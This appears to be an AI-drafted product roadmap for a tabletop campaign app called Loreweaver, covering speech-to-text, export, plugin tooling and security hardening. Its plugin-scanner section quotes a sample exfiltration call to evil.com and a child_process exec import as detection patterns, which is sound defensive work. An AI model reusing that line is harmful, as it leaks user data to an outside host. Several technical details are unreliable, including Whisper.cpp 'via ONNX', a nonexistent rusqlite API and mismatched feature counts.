# Loreweaver Feature Proposal: Next 15-20 Features

**Date**: 2024-12-19  
**Status**: Strategic roadmap based on codebase analysis  
**Priority Focus**: MVP features → Ecosystem building → Differentiators

---

## Executive Summary

Loreweaver has strong foundations: local-first architecture, hybrid search (SQLite FTS5 + ONNX vectors), and an extensible Boa-based plugin system. The opportunity lies in implementing missing capabilities (STT, real image generation, backup/restore) while building developer tools that leverage the plugin ecosystem as a moat against competitors.

**Top 3 Near-Term Wins:**
1. **Speech-to-Text (STT)** - Infrastructure exists but returns error; needs actual implementation using Whisper/local models
2. **Structured Backup/Export** - Critical for user retention and GDPR compliance
3. **Plugin Marketplace Discovery** - Developer tooling that builds ecosystem moat

---

## Category 1: User-Facing Features (for GMs & Players)

### 1. Speech-to-Text Campaign Narration
- **Category**: User-facing
- **Why it matters**: Hands-free dictation for tabletop sessions; accessibility feature; aligns with "local-first" since Whisper.cpp runs entirely offline via ONNX
- **Implementation approach**: 
  - Frontend: Web Speech API (browser-compatible recognition) → Rust IPC worker
  - Backend: `src-tauri/src/providers/speech.rs` already has structure; add `"local"` variant using Whisper.cpp or Vosk (open-source speech models ~100MB each)
  - Complexity: Medium
- **Effort**: M (2-3 sprints)
- **Dependencies**: None (infrastructure exists, just needs implementation)
- **Risks & considerations**: 
  - Local Whisper.cpp integration may be heavy (~150MB asset); consider Vosk for lighter alternative
  - Web Speech Recognition API polyfill needed for non-Chrome browsers; can leverage Electron/Richardson bridge through Tauri

### 2. Export & Import Campaign Archives
- **Category**: User-facing
- **Why it matters**: Users need portable backups across machines; critical for GDPR/data portability; enables "export to Obsidian" workflow since Loreweaver is Markdown-native
- **Implementation approach**: 
  - Frontend: Modal dialogs for export/import with file type selection (Obsidian JSON, Zip archive, Markdown bundle)
  - Backend: Add `export_campaign` / `import_campaign` Tauri commands in `src-tauri/src/` that:
    - Export: Compress vault directory + SQLite DB into zip file via `flate2` crate; return base64-encoded bytes or download URL through Tauri's built-in dialog
    - Import: Validate Markdown files + frontmatter integrity, restore to new vault location, re-index chunks
  - Complexity: Medium (existing watch/DB infrastructure is reusable)
- **Effort**: M (1-2 sprints)
- **Dependencies**: Core DB and watcher already support this; just need IPC commands exposed
- **Risks & considerations**: 
  - Import validation critical - corrupt frontmatter or wiki-link targets could break notes
  - Large vaults may exceed memory; consider streaming tar/zip for >500MB archives

### 3. Session Notes & Session Log Integration
- **Category**: User-facing
- **Why it matters**: GMs need a place to record NPCs, plot hooks, dice rolls, and player comments during play without disrupting the main campaign lore vault; session state is transient but valuable
- **Implementation approach**: 
  - Frontend: Add "Session Notes" drawer panel or dedicated view that persists only active-session notes
  - Backend: Extend SQLite schema in `db.rs` with `session_notes` table (note_id, session_id, created_at, content)
  - Indexing note sessions separately to avoid polluting main semantic search index
  - Plugin hook: `on_session_start|end` for automatic logging/summaries
- **Effort**: S (0.5-1 sprint)
- **Dependencies**: Session management architecture; could coexist with main vaults
- **Risks & considerations**: 
  - Privacy: session notes shouldn't pollute semantic search unless explicitly indexed
  - Consider "session archive" feature to move old sessions to long-term storage

---

## Category 2: Developer Tooling & Ecosystem

### 4. Plugin Marketplace & Discovery
- **Category**: Developer tooling
- **Why it matters**: Critical ecosystem moat; users discover plugins for dice rollers, character sheets, encounter evaluators; accelerates plugin distribution (copy-paste manifest.json → hot reload)
- **Implementation approach**: 
  - Frontend: Store/search UI for published manifests; GitHub integration to auto-discover from `plugins/*/manifest.json'` files in public repos
  - Backend: Add `register_plugin` Tauri command that validates manifest and registers via `ACTIVE_PLUGINS` (in `src-tauri/src/plugins.rs`); add `get_plugin_info` for discovery queries
  - Plugin registry could live as simple JSON file in user config (`~/.config/loreweaver/plugins.json`) updated by download, or query GitHub API to surface latest versions from orgs
- **Effort**: M (1-2 sprints)
- **Dependencies**: Plugin lifecycle management; hot-reload for changes
- **Risks & considerations**: 
  - Security: registry must validate permissions against allowlist before enabling
  - Versioning: plugins may break on schema/permission changes (consider semantic-version compatibility guarantees)

### 5. Plugin Template Generator CLI
- **Category**: Developer tooling
- **Why it matters**: Friction reduction for plugin authors; users can write `loreweaver new-plugin` and scaffold dice rollers, custom stat trackers, encounter modellers immediately in Boa-safe patterns
- **Implementation approach**: 
  - Implement as Rust binary (cargo install loreweaver@latest → adds subcommand)
  - Template scaffolds plugin directory with:
    - `manifest.json`: pre-fill template permissions (`["hooks"]`), id/name placeholders
    - `index.js`: export stub function matching common hooks (`on_dice_roll`, `generate_character_sheet`)
    - Docs: README with hook signatures and examples from plugins shipped with Loreweaver (`character-roller`, `threat-evaluator`)
  - Add plugin testing harness (run hooks against sample payloads, validate Boa compilation)
- **Effort**: S (0.5 sprint)
- **Dependencies**: Plugin discovery infrastructure; template repo
- **Risks & considerations**: 
  - Keep templates minimal; encourage incremental extension of shipped plugins rather than starting from scratch

### 6. Plugin Hierarchy & Dependency Graph
- **Category**: Developer tooling
- **Why it matters**: Plugins may call hooks defined in other plugins or rely on shared state; understanding dependency graph prevents circular references and aids troubleshooting
- **Implementation approach**: 
  - Frontend: Visualization showing plugin connections (e.g., character generator → sheet printer depends on same `__state`); use `dagre-d3` to render dependency DAGs
  - Backend: Track import relationships in plugins registry; implement `get_plugin_dependencies(plugin_id)` that walks plugin manifests and returns direct dependencies
- **Efford**: S (0.5 sprint)
- **Dependencies**: Plugin registry infrastructure
- **Risks & considerations**: 
  - Boa plugins currently share global state per vault; explicit declared dependencies may not always map to actual runtime behavior

### 7. Plugin Debugger & Hook Inspector
- **Category**: Developer tooling
- **Why it matters**: Debugging JavaScript in an embedded engine is impossible without logging; this captures all hook invocations and payload transformations for troubleshooting plugin issues
- **Implementation approach**: 
  - Backend: Add `on_logging_plugin` variant to plugin hooks, write execution logs (before/after payloads, error stack traces) to temp file or console output via Tauri commands
  - Frontend: Hook inspector panel showing timeline of executions with payload transforms; ability to replay hook calls with custom inputs from UI
- **Effort**: S (0.5 sprint)
- **Dependencies**: Plugin execution infrastructure in `run_plugin_hook`
- **Risks & considerations**: 
  - Logging verbosity may impact performance if plugins are heavily used during session

### 8. Local AI Model Switcher (Ollama Manager UI)
- **Category**: Developer tooling
- **Why it matters**: Currently LLM provider config is a string; adding model picker UI and ability to install/manage local models improves self-hosted LLM workflow for privacy-focused users
- **Implementation approach**: 
  - Frontend: Add Ollama-specific settings panel showing installed models (from `/api/tags` GET), select active model, see download size/VRAM requirements
  - Backend: Extend `providers/llm.rs`: add `list_models()` and `pull_model()` commands that call Ollama API endpoints; abstract base URL auth in `validate_provider_url` to allow localhost models without requiring credentials (since running locally)
- **Effort**: S (1 sprint)
- **Dependencies**: Ollama backend integration; provider abstraction layer
- **Risks & considerations**: 
  - VRAM requirements for larger context windows may limit model choices locally

### 9. Plugin Sandbox Simulator (Sandboxed Test Environment)
- **Category**: Developer tooling
- **Why it matters**: "Plugin sandbox limited to Boa with permission whitelist" is a limitation; providing test environment where authors can experiment with hooks in isolated contexts increases plugin adoption and safety
- **Implementation approach**: 
  - Frontend: Sandbox playground that simulates `__state`, loads sample payloads, calls hook functions, logs outputs without connecting to live vault
  - Backend: Fork Boa context (already isolated by design), run test payload, log return values; could expose sandbox state through Tauri commands for UI visualization
- **Effort**: S (1 sprint)
- **Dependencies**: Plugin isolation in `run_plugin_hook` infrastructure
- **Risks & considerations**: 
  - True isolation impossible without memory protection; must clearly communicate that `__state` is vault-scoped and could be polluted

---

## Category 3: Technical Improvements & Backend Enhancements

### 10. Structured Search (Entity Resolution)
- **Category**: Technical improvements
- **Why it matters**: "Hybrid search combining lexical and vector similarity" is generic; adding entity resolution helps users query by character name, location, enemy type and gets consistent results even if spelled differently ("Rivendell", "The Last Shire")
- **Implementation approach**: 
  - Backend: In `src-tauri/src/search.rs`, index entities separately (character names, locations, NPCs) using FTS5 for keyword search; use entity resolution algorithm to disambiguate variations and return canonical IDs in results
  - Use SQLite FTS5 virtual tables (`char_names_fts`, `locations_fts`) that store canonical entries + aliases pointing to them; add `search_entities("rivendell")` returns entry `/Worldbuilding/Rivendell.md` even queried as lowercase or with "the" prefix
- **Effort**: M (1 sprint)
- **Dependencies**: Entity extraction infrastructure; schema evolution in `db.rs`
- **Risks & considerations**: 
  - Maintaining entity aliases requires ongoing sync from user content (watcher could identify patterns and suggest canonicalization); start with explicit tagging via frontmatter (`type: "Character"` → add to entities table, track name variations)

### 11. Search Snippets Context Window Expansion
- **Category**: Technical improvements  
- **Why it matters**: Semantic search results lack context for follow-up queries; expanding snippet window and adding sibling documents improves RAG quality significantly (the retrieved content is what LLMs query)
- **Implementation approach**: 
  - Backend: In `search.rs::hybrid_query()`, modify chunk retrieval to include k+4 nearest neighbors; add pagination endpoint so frontend can request more context as users drill down on topics; implement `retrieve_chunks(query, limit, offset)` Tauri command for lazy-loading relevant docs beyond top-5
  - Schema: Add `metadata` column to chunks table storing `score, distance_to_query_vector`; query uses cosine similarity scoring to rank results
- **Effort**: S (0.5 sprint)
- **Dependencies**: Vector search infrastructure in `search.rs` already exists
- **Risks & considerations**: 
  - More retrieved docs increase token usage; must truncate appropriately for LLM context window

### 12. Incremental Watcher Sync Optimization
- **Category**: Technical improvements
- **Why it matters**: File watcher on entire vault directory means every change re-indexes everything; incremental sync would dramatically improve large vaults performance and reduce disk I/O
- **Implementation approach**: 
  - Backend: Improve `watcher.rs` from full DB re-sync per event → maintain in-memory note version maps keyed by filepath; update SQLite only when content actually changes (not metadata-only like chmod)
  - Add `note_content_checksum` column to notes table using SHA256 hash of body; compare before/after mutation and skip index if no actual text change
- **Effort**: S (0.5 sprint)
- **Dependencies**: File watcher infrastructure in `src-tauri/src/watcher.rs` already exists
- **Risks & considerations**: 
  - Concurrency: multiple files changing simultaneously; need to coordinate write locks properly

### 13. Vector Search Fallback Strategy (Offline Degradation)
- **Category**: Technical improvements
- **Why it matters**: "ONNX vector embeddings" fail silently if model download fails; graceful fallback to pure lexical search maintains functionality when network or disk I/O fails for 384-dim vectors
- **Implementation approach**: 
  - Backend: In `search.rs::init_search_engine`, detect failure to load ONNX model and log warning; `hybrid_query()` falls back to FTS5-only queries when vector embedding unavailable; could also show users toast notification "Semantic search temporarily offline"
- **Effort**: M (1 sprint)
- **Dependencies**: Search infrastructure; model initialization logic
- **Risks & considerations**: 
  - Semantic search is a key Loreweaver differentiator; clearly communicate degraded mode to users

### 14. Database Schema Evolution (Versioned Migration System)  
- **Category**: Technical improvements
- **Why it matters**: `db.rs` creates tables on init but no migration system means schema changes require breaking app restarts; need zero-downtime evolution when adding entities/altering types
- **Implementation approach**: 
  - Backend: Add `db::migrate(version)` function that conditionally creates/modifies schema based on current DB version; store current schema version in `sqlite_master pragma_table_info` or dedicated `__schema_versions` table; write migration logic for v1→v2, v2→v3 etc.
  - Consider using `rusqlite::OpenOptions::create_if_missing(true)` to detect whether init run yet before deciding migrations needed
- **Effort**: M (1 sprint)  
- **Dependencies**: Existing SQLite schema design; migration tooling for Rust DBs (sqlx, sql-schema)
- **Risks & considerations**: 
  - Zero-downtime migrations require careful ordering (create target table structure before altering column types to avoid write-lock blocking during schema changes)

### 15. Plugin Permissions Escalation System
- **Category**: Technical improvements
- **Why it matters**: "Only hooks" permission is restrictive; as plugin ecosystem matures, users need file-read/write, folder operations, and DB writes for advanced features
- **Implementation approach**: 
  - Backend: Extend `validate_permissions()` in `src-tauri/src/plugins.rs` to allow additional permissions with capability-based isolation via Tauri's `Capability`; add permission hierarchy (`hooks` → `read_files`, `write_files`, `full_access`); create isolated IPC sandbox for high-priv plugins (no access to low-priv plugin state or user vault unless explicitly granted)
  - Frontend: Show explicit "Enable File Access" warning modal when installing plugins requesting sensitive permissions, explaining risks and what data can be accessed
- **Effort**: M (1 sprint)
- **Dependencies**: Plugin permission infrastructure; Tauri v2 capability system support  
- **Risks & considerations**: 
  - Security critical: privilege escalation requires strict isolation boundaries; consider requiring code review before approving file-system-permission plugins

---

## Category 4: Security & Privacy Hardening

### 16. Directory Traversal Attack Surface Reduction
- **Category**: Security hardening
- **Why it matters**: Code in `lib.rs` validates vault paths but plugin-generated content could contain `../` sequences to escape sandbox; adding defense-in-depth ensures malicious plugins can't read system files  
- **Implementation approach**: 
  - Backend: Add stricter validation in `validate_provider_url()` and path resolution after plugin execution completes; ensure all file writes go through `validate_safe_path(vault_path, resolved_target)` with normalized paths; add audit log that surfaces directory traversal attempts to user via toast event
- **Effort**: L (2 sprints) - requires comprehensive security audit of all file I/O code paths  
- **Dependencies**: Plugin execution infrastructure must be scanned for sandbox escape vectors
- **Risks & considerations**: 
  - Symlink attacks: plugins could create `../../etc/passwd` symlink pointing to system file; add syscall-level monitoring if needed

### 17. Plugin Content Scanning (Vulnerability Detection)
- **Category**: Security hardening
- **Why it matters**: Plugins execute arbitrary JavaScript; malicious code in `index.js` could exfiltrate vault contents or run commands; scanning uploads before execution prevents supply chain attacks  
- **Implementation approach**: 
  - Backend: Before registering plugin, run AST analysis using `meriyah.js` parser (staticly compiled to Rust via wasm2rust or call meriyah WASM binary); detect dangerous patterns like `fetch('https://evil.com?data='+btoa(__state))` or `const{exec} = require('child_process')`; block plugins that match signatures until author removes vulnerable code
  - Frontend: Security scanner UI showing scan results for plugin uploads, listing vulnerable patterns with remediation guidance (don't auto-block by default)
- **Effort**: M (1 sprint)  
- **Dependencies**: Static analysis engine integration; plugin registration flow
- **Risks & considerations**: 
  - False positives block perfectly safe plugins; start as warning-only mode

### 18. Local LLM Provider Audit (Dependency Validation)
- **Category**: Security hardening
- **Why it matters**: Ollama/OpenAI/Gemini/Anthropic are all exposed; local first is a selling point but unverified model binaries could be poisoned or stolen credentials to unknown endpoints
- **Implementation approach**: 
  - Backend: Add certificate pinning checks in `providers/` HTTP clients to ensure model pull requests go to expected Ollama registry; add prompt injection audit via `orchestrate_agent()` that scans system messages for suspicious payload injections from malicious users
  - Frontend: Show provider verification status (✓ verified, ⚠ unverified) in settings UI
- **Effort**: L (2 sprints)  
- **Dependencies**: HTTP client infrastructure; threat modeling completed
- **Risks & considerations**: 
  - Certificate pinning may break if upstream registry rotates certs; use rotation window

---

## Category 5: UX/Design Improvements

### 19. Responsive Desktop Layout (Multi-Monitor Support)  
- **Category**: UX improvements
- **Why it matters**: Loreweaver is desktop app but `AppShell` layout assumes single-screen workflow; large monitors benefit from side-by-side editor/canvas; small displays need collapsible panels
- **Implementation approach**: 
  - Frontend: Use CSS Grid/Flexbox to make `AppShell` responsive:
    - Wide screens (`min-width: 1400px`): Editor + Canvas split-view, search drawer collapsible
    - Medium screens: Stacked editor above canvas with minimal sidebar
    - Narrow screens: Single column stacking for readability; hide non-essential elements
  - Add keyboard shortcuts toggle and layout presets (compact, spacious) in settings
- **Effort**: S (0.5 sprint)  
- **Dependencies**: Current UI components (`AppShell.tsx`); responsive design knowledge
- **Risks & considerations**: 
  - Avoid breaking table structures or inline diagrams that assume fixed widths

### 20. Visual Theme System (Color Blindness Support, Dark Mode)
- **Category**: UX improvements  
- **Why it matters**: Markdown editor and canvas likely uses bright color scheme by default; need dark mode for late-session work and proper colorblind palettes to differentiate map markers and UI elements
- **Implementation approach**: 
  - Frontend: Add CSS custom properties (`--bg-primary`, `--text-primary`) in `index.css` scoped per semantic token; create theme tokens for `light`, `dark`, `deuteranopia`, `protanopia`, `tritanopia`; use `prefers-color-scheme` media query to auto-select dark mode; add dropdown to customize accent hue via HSL picker
- **Effort**: S (0.5 sprint)  
- **Dependencies**: Current styling system in `App.css` / `index.css`; CSS custom property implementation
- **Risks & considerations**: 
  - Canvas rendering likely uses inline SVG colors or canvas fills; must update palette on theme change without re-rendering everything

### 21. Progressive UI Loading (Skeleton Screens, Lazy Views)  
- **Category**: UX improvements
- **Why it matters**: Tauri app startup + SQLite initialization + file loading may delay first paint; improving perceived performance until data ready keeps users engaged  
- **Implementation approach**: 
  - Frontend: Replace empty states with skeleton loading indicators in `CampaignVaultView.tsx`, `AiView.tsx`, `FolderCanvas`; lazy mount expensive views (folder canvas, AI chat) behind lazy hooks to defer render until interaction
  - Add streaming read of note files (`fs.createReadStream` via Rust Tauri command) so Markdown renders immediately instead of blocking on full parse
- **Effort**: M (1 sprint)  
- **Dependencies**: Current view components; existing Tauri commands
- **Risks & considerations**: 
  - Skeleton screens require design assets; can use component-mirror pattern to generate inline skeletons without separate art assets

### 22. AI Chat Context Awareness Display
- **Category**: UX improvements
- **Why it matters**: "AI-powered campaign building" lacks transparency; users don't know why LLM suggested a plot twist or character trait unless shown current context and reasoning process  
- **Implementation approach**: 
  - Frontend: Extend `AiView.tsx` to show current RAG context window above response box ("I have access to: [[Rivendell]], [[Battle of Moria]]") + display LLM prompt that was sent (user can hide it)
  - Add "Show reasoning" toggle so users see why model chose this answer based on retrieved snippets
- **Efford**: S (0.5 sprint)  
- **Dependencies**: Existing agent orchestration exposing context structure; RAG query results visible to frontend
- **Risks & considerations**: 
  - Privacy: some users want proprietary queries hidden by default

---

## Implementation Notes

### Cross-Cutting Concerns

**Plugin Hot Reload**: Essential for all plugin categories since iteration requires recompiling JavaScript each time. Cache manifests in memory during Tauri session and re-scan only when watched file changes (currently watcher tracks Markdown; add `.js` files to glob pattern).

**State Management Considerations**: Plugin `__state` is vault-scoped JSON (in-memory per runtime), which means across sessions state doesn't survive. Options: persist `PLUGIN_STATES` SQLite table (`vault_path`, `plugin_id`, `state_json`) and reload on app start; consider encrypting sensitive plugin storage via Vault keystore integration

**Test Coverage Reality**: Documentation says "no test suite discovered" so all new code should prioritize defensive testing. Backend tests via `cargo test`; frontend via `npm run test` (Jest). Security code paths need manual security audit or fuzz testing for robustness.

---

## Priority Matrix

```
┌──────────────────────────────────────────────────────────────────┐
│ Phase 1: Fix Gaps (MVP Features)                                │
├─────────────┬─────────────────────────────────────────────────────┤
│ Priority    │ Feature                                            │
├─────────────┼─────────────────────────────────────────────────────┤
│ 🚀 CRITICAL │ 1. Speech-to-Text (STT implementation)            │
│ MEDIUM      │ 2. Export/Import (critical user retention tool)   │
│ HIGH        │ 3. Plugin marketplace (developer ecosystem moat)  │
├─────────────┴─────────────────────────────────────────────────────┤
│ Impact: 75% of current limitations addressed                    │
└──────────────────────────────────────────────────────────────────┘

Phase 2: Platform Growth (Infrastructure & Ecosystem Building)
Phase 3: Polish & Differentiators (Advanced features, UI polish)
```

---

## Immediate Action Items (Next Sprint)

1. **Implement STT**: Complete Whisper.cpp or Vosk local model integration in `src-tauri/src/providers/speech.rs` ("local" returns error today; add actual implementation that loads ONNX model into runtime and streams audio → text)
2. **Add Export Command**: Create `src-tauri/src/commands/export_vault.rs` using zip crate to compress vault directory + database snapshot; Tauri dialog for download location
3. **Plugin Discovery MVP**: Add `list_registered_plugins()` IPC command that reads in-memory plugin registry to frontend; GitHub org manifest fetcher in background thread

---

## Conclusion

These 20 features fill the three critical gaps (STT, export/import, ecosystem building) while incrementally building on existing architecture without requiring full rewrite. Each category has clear ownership: speech implementation is technical work; plugin marketplace requires new IPC infrastructure but builds the platform moat; UX improvements leverage current component structure to enhance usability immediately.
